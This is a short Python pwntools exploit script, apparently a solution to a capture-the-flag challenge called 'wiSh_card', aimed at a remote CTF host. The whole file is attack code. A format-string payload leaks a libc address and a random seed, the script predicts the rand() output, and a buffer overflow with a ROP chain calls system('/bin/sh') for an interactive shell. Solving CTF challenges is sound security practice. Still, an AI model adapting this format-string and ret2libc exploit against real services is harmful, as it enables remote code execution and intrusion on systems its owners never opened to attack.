#!/usr/bin/env python3
from ctypes import CDLL
from pwn import *
exe = ELF("./wiSh_card_patched")
libc = CDLL("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

#p = process()
#gdb.attach(p,gdbscript='''
#           b*write_wish+191
#           ''')
p = remote('ctfnhack.challs.ctflib.eu',20819)


p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'recipient: ',b'%44$p|%21$p')
p.recvuntil(b'Username: ')
libc_base = int(p.recvuntil(b'|')[:-1],16) - 0x29e25
print("libc: ",hex(libc_base))
rand = int(p.recvline()[:-1],16)
rand = rand >> 32
print(type(rand))
print("this is rand: ",hex(rand))
libc.srand(rand)
pop_rdi = 0x000000000002a205+libc_base
system = libc_base + 0x528f0
bin_sh = libc_base + 0x1a7e43
p.sendlineafter(b'[Y/n] ',b'Y')
value = libc.rand()
p.sendlineafter(b'number: ',str(value))
input()
p.sendafter(b'wish: ',b'a'*56 + p64(pop_rdi) + p64(bin_sh) + p64(pop_rdi+1) + p64(system))

p.interactive()
